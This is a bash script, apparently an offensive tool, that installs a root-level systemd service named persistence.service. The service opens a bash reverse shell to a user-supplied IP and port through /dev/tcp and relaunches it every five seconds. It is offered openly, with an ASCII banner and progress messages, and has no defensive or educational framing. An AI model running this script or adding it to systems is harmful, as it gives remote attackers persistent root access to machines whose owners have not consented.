#!/bin/bash
# Simple script to automate systemd persistence
# https://youtube.com/c/MatheuZSecurity

red='\033[33;31m'
green='\033[33;32m'

if [[ $(id -u) -ne "0" ]]; then
        echo "[ERROR] You must run this script as root" >&2
        exit 1
fi
echo -ne "$red
  ██████▓██   ██▓  ██████ ▄▄▄█████▓▓█████  ███▄ ▄███▓▓█████▄                     
▒██    ▒ ▒██  ██▒▒██    ▒ ▓  ██▒ ▓▒▓█   ▀ ▓██▒▀█▀ ██▒▒██▀ ██▌                    
░ ▓██▄    ▒██ ██░░ ▓██▄   ▒ ▓██░ ▒░▒███   ▓██    ▓██░░██   █▌                    
  ▒   ██▒ ░ ▐██▓░  ▒   ██▒░ ▓██▓ ░ ▒▓█  ▄ ▒██    ▒██ ░▓█▄   ▌                    
▒██████▒▒ ░ ██▒▓░▒██████▒▒  ▒██▒ ░ ░▒████▒▒██▒   ░██▒░▒████▓                     
▒ ▒▓▒ ▒ ░  ██▒▒▒ ▒ ▒▓▒ ▒ ░  ▒ ░░   ░░ ▒░ ░░ ▒░   ░  ░ ▒▒▓  ▒                     
░ ░▒  ░ ░▓██ ░▒░ ░ ░▒  ░ ░    ░     ░ ░  ░░  ░      ░ ░ ▒  ▒                     
░  ░  ░  ▒ ▒ ░░  ░  ░  ░    ░         ░   ░      ░    ░ ░  ░                     
      ░  ░ ░           ░              ░  ░       ░      ░                        
         ░ ░                                          ░                          
             ▄▄▄▄    ▄▄▄       ▄████▄   ██ ▄█▀▓█████▄  ▒█████   ▒█████   ██▀███  
            ▓█████▄ ▒████▄    ▒██▀ ▀█   ██▄█▒ ▒██▀ ██▌▒██▒  ██▒▒██▒  ██▒▓██ ▒ ██▒
            ▒██▒ ▄██▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ ░██   █▌▒██░  ██▒▒██░  ██▒▓██ ░▄█ ▒
            ▒██░█▀  ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ ░▓█▄   ▌▒██   ██░▒██   ██░▒██▀▀█▄  
            ░▓█  ▀█▓ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄░▒████▓ ░ ████▓▒░░ ████▓▒░░██▓ ▒██▒
            ░▒▓███▀▒ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒ ▒▒▓  ▒ ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░
            ▒░▒   ░   ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░ ░ ▒  ▒   ░ ▒ ▒░   ░ ▒ ▒░   ░▒ ░ ▒░
             ░    ░   ░   ▒   ░        ░ ░░ ░  ░ ░  ░ ░ ░ ░ ▒  ░ ░ ░ ▒    ░░   ░ 
             ░            ░  ░░ ░      ░  ░      ░        ░ ░      ░ ░     ░     
                  ░           ░                ░                                "



echo -ne "$green\n"

echo -ne "[*] G3t r00tsh3ll 3v3ry 5 s3c0nds [*]\n\n"

read -p "Input your IP:  " ip
read -p "Input your PORT: " port

arr=('.' '..' '...' '....')

for c in $(seq 1); do
        for elt in ${arr[*]}; do
                echo -ne "\r\033[<1>Ainitializing the service $elt" && sleep 0.1;
        done
done

echo -ne "\n"

function SystemdPersistence () {
	 echo "[Unit]" > /etc/systemd/system/persistence.service
	 echo "Description= Systemd Persistence" >> /etc/systemd/system/persistence.service
	 echo "" >> /etc/systemd/system/persistence.service
	 echo "[Service]" >> /etc/systemd/system/persistence.service
	 echo "User=root" >> /etc/systemd/system/persistence.service
	 echo "Group=root" >> /etc/systemd/system/persistence.service
	 echo "WorkingDirectory=/root" >> /etc/systemd/system/persistence.service
	 echo "ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'" >> /etc/systemd/system/persistence.service
	 echo "Restart=always" >> /etc/systemd/system/persistence.service
	 echo "RestartSec=5" >> /etc/systemd/system/persistence.service
	 echo "" >> /etc/systemd/system/persistence.service
	 echo "[Install]" >> /etc/systemd/system/persistence.service
	 echo "WantedBy=multi-user.target" >> /etc/systemd/system/persistence.service
}

message="[*] setup completed! [*]"

for i in $(seq 1 ${#message}); do
        echo -ne "${message:i-1:1}"
        sleep 0.03
done

echo -ne "\n"

clear

msg="[*] Activating the service [*]"

function EnablePersistence () {
	systemctl enable persistence.service
	systemctl start persistence
}

echo -ne "\n"

clear

scs="[*] Success! [*]"

for i in $(seq 1 ${#scs}); do
        echo -ne "${scs:i-1:1}"
        sleep 0.08
done

echo -ne "\n"

clear

SystemdPersistence && EnablePersistence /

clear
